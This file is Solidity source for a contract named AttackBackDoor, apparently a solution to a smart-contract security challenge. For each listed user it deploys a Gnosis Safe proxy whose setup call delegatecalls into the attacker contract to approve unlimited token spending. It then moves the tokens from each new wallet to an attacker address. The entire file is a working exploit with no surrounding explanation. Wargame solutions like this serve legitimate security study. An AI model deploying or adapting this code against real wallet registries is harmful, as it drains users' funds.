// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract AttackBackDoor {
    address public masterCopyAddress;
    address public walletRegistryAddress;
    address token;
    GnosisSafeProxyFactory immutable proxyFactory;

    constructor(
        address _proxyFactoryAddress,
        address _walletRegistryAddress,
        address _masterCopyAddress,
        address _token
    ) {
        proxyFactory = GnosisSafeProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
        token = _token;
    }

    // we cant delegatecall directly into the ERC20 token's approve function because the state changes would
    // apply for the proxy (set allowance, which is not present on proxy) so instead we used a hop like:
    // this.createProxyWithCallback call -> proxy delegatecall -> this.approve (msg.sender = proxy) -> erc20.approve
    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(address attackerAddress, address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            // add the current user as the owner of the proxy
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            // encode payload to approve tokens for this contract
            bytes memory encodedApprove = abi.encodeWithSignature(
                "approve(address,address)",
                address(this),
                token
            );

            /// @dev Setup function sets initial storage of contract.
            /// @param _owners List of Safe owners.
            /// @param _threshold Number of required confirmations for a Safe transaction.
            /// @param to Contract address for optional delegate call.
            /// @param data Data payload for optional delegate call.
            /// @param fallbackHandler Handler for fallback calls to this contract
            /// @param paymentToken Token that should be used for the payment (0 is ETH)
            /// @param payment Value that should be paid
            /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
            // function setup(
            //     address[] calldata _owners,
            //     uint256 _threshold,
            //     address to,
            //     bytes calldata data,
            //     address fallbackHandler,
            //     address paymentToken,
            //     uint256 payment,
            //     address payable paymentReceiver
            // )
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                uint256(1),
                address(this),
                encodedApprove,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );
            // GnossisSafe::setup function that will be called on the newly created proxy
            // pass in the approve function to to delegateCalled by the proxy into this contract

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                masterCopyAddress,
                initializer,
                0,
                IProxyCreationCallback(walletRegistryAddress)
            );

            // transfer the approved tokens
            IERC20(token).transferFrom(
                address(proxy),
                attackerAddress,
                10 ether
            );
        }
    }
}
